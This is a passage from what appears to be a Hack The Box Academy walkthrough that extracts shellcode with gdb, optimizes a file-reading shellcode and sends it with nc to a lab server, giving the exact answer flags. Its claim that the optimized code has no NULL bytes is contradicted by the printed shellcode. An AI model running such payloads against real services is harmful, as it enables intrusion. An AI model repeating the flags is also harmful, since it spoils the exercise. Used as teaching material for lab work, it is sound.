Students then need to use the "assembler.sh" script that was provided in the `Assembling & Disassembling` section on the edited file, supplying the `-g` flag to debug it with `gdb`, run the program, and then examine the value of the first 14 bytes of `rsp` in hexadecimal:

Code: shell

```shell
sudo ./assembler.sh loadedShellcode.s -g
r
x/14gx $rsp
```

```
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-qdsydmrlsz]─[~]
└──╼ [★]$ sudo ./assembler.sh loadedShellcode.s -g

Reading symbols from loadedShellcode...
(No debugging symbols found in loadedShellcode)
(gdb) r
Starting program: /home/htb-ac413848/loadedShellcode 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004010b5 in ?? ()
(gdb) x/14gx $rsp
0x7fffffffe480:	0x4831c05048bbe671	0x167e66af44215348
0x7fffffffe490:	0xbba723467c7ab51b	0x4c5348bbbf264d34
0x7fffffffe4a0:	0x4bb677435348bb9a	0x10633620e7711253
0x7fffffffe4b0:	0x48bbd244214d14d2	0x44214831c980c104
0x7fffffffe4c0:	0x4889e748311f4883	0xc708e2f74831c0b0
0x7fffffffe4d0:	0x014831ff40b70148	0x31f64889e64831d2
0x7fffffffe4e0:	0xb21e0f054831c048	0x83c03c4831ff0f05
```

Students need to stitch together the hex values after removing `0x` using some Linux command line-fu:

Code: shell

```shell
echo '0x7fffffffe480: 0x4831c05048bbe671      0x167e66af44215348
0x7fffffffe490: 0xbba723467c7ab51b      0x4c5348bbbf264d34
0x7fffffffe4a0: 0x4bb677435348bb9a      0x10633620e7711253
0x7fffffffe4b0: 0x48bbd244214d14d2      0x44214831c980c104
0x7fffffffe4c0: 0x4889e748311f4883      0xc708e2f74831c0b0
0x7fffffffe4d0: 0x014831ff40b70148      0x31f64889e64831d2
0x7fffffffe4e0: 0xb21e0f054831c048      0x83c03c4831ff0f05' | sed 's/0x//g' | awk '{print $2 $3}' | tr -d "\n\r"
```

```
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-6hndjl5j1k]─[~]
└──╼ [★]$ echo '0x7fffffffe480: 0x4831c05048bbe671      0x167e66af44215348
0x7fffffffe490: 0xbba723467c7ab51b      0x4c5348bbbf264d34
0x7fffffffe4a0: 0x4bb677435348bb9a      0x10633620e7711253
0x7fffffffe4b0: 0x48bbd244214d14d2      0x44214831c980c104
0x7fffffffe4c0: 0x4889e748311f4883      0xc708e2f74831c0b0
0x7fffffffe4d0: 0x014831ff40b70148      0x31f64889e64831d2
0x7fffffffe4e0: 0xb21e0f054831c048      0x83c03c4831ff0f05' | sed 's/0x//g' | awk '{print $2 $3}' | tr -d "\n\r"

4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05
```

The final shellcode is:

```
4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05
```

At last, using `loader.py` that was provided in the `Shellcodes` section, students need to run it on the shellcode to get the flag `HTB{4553mbly_d3bugg1ng_m4573r}`:

Code: shell

```shell
python3 loader.py '4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05'
```

```
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-yaeifjqf6q]─[~]
└──╼ [★]$ python3 loader.py '4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05'

HTB{4553mbly_d3bugg1ng_m4573r}
```

Answer: `HTB{4553mbly_d3bugg1ng_m4573r}`

# Skills Assessment

## Question 2

### "The above server simulates a vulnerable server that we can run our shellcodes on. Optimize 'flag.s' for shellcoding and get it under 50 bytes, then send the shellcode to get the flag. (Feel free to find/create a custom shellcode)"

After spawning the target machine, students need to download [flag.zip](https://academy.hackthebox.com/storage/modules/85/flag.zip) then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/flag.zip && unzip flag.zip
```

```
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-6hndjl5j1k]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/flag.zip && unzip flag.zip

--2022-12-16 12:38:26--  https://academy.hackthebox.com/storage/modules/85/flag.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/zip]
Saving to: ‘flag.zip’

flag.zip                                     100%[=============================================================================================>]     476  --.-KB/s    in 0s      

2022-12-16 12:38:26 (3.13 MB/s) - ‘flag.zip’ saved [476/476]

Archive:  flag.zip
  inflating: flag.s
```

Code: nasm

```nasm
global _start

section .text
_start:
    ; push './flg.txt\x00'
    push 0              ; push NULL string terminator
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    mov rax, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    mov rsi, 0          ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    mov rax, 0          ; read syscall number
    mov rdx, 24         ; size to read
    syscall

    ; write output
    mov rax, 1          ; write syscall
    mov rdi, 1          ; set fd to stdout
    mov rdx, 24         ; size to read
    syscall

    ; exit
    mov rax, 60
    mov rdi, 0
    syscall
```

Inspecting "flag.s", students need to optimize it by removing the `exit` `syscall`, fixing all `mov` instructions to use matching register size, and replacing `push 0` with `xor rax, rax` `push rax`, making it meet the `shellcoding requirements` as described in the `Shellcoding Techniques` section:

1. `Does not contain variables`
2. `Does not refer to direct memory addresses`
3. `Does not contain any NULL bytes 00`

The resultant optimized assembly code becomes:

Code: nasm

```nasm
global _start

section .text
_start:
    ; push './flg.tx\x00'
    xor rax, rax
    push rax
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    mov al, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    mov rsi, 0          ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    mov al, 0          ; read syscall number
    mov dl, 24         ; size to read
    syscall

    ; write output
    mov al, 1          ; write syscall
    mov dil, 1          ; set fd to stdout
    mov dl, 24         ; size to read
    syscall
```

Students need to assemble the file then link it to attain the binary of it:

Code: shell

```shell
nasm -f elf64 flag.s
ld -o flag flag.o
```

```
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-zgbckjjywe]─[~]
└──╼ [★]$ nasm -f elf64 flag.s
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-zgbckjjywe]─[~]
└──╼ [★]$ ld -o flag flag.o
```

Subsequently, using `shellcoder.py` from the `Shellcodes` section, students need to extract the shellcode from the binary:

```shell
python3 shellcoder.py flag
```
```
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-zgbckjjywe]─[~]
└──╼ [★]$ python3 shellcoder.py flag

4831c05048bf2f666c672e74787457b0024889e7be000000000f05488d374889c7b000b2180f05b00140b701b2180f05
```

At last, students need to connect to the spawned target machine using `nc` and feed it the extracted shellcode to receive the flag `HTB{5h3llc0d1ng_g3n1u5}`:

```shell
nc STMIP STMPO
4831c05048bf2f666c672e74787457b0024889e7be000000000f05488d374889c7b000b2180f05b00140b701b2180f05
```
```
┌─[eu-academy-1]─[10.10.15.11]─[htb-ac413848@htb-zgbckjjywe]─[~]
└──╼ [★]$ nc 165.232.32.50 30739

4831c05048bf2f666c672e74787457b0024889e7be000000000f05488d374889c7b000b2180f05b00140b701b2180f05
HTB{5h3llc0d1ng_g3n1u5}
```

Answer: `HTB{5h3llc0d1ng_g3n1u5}`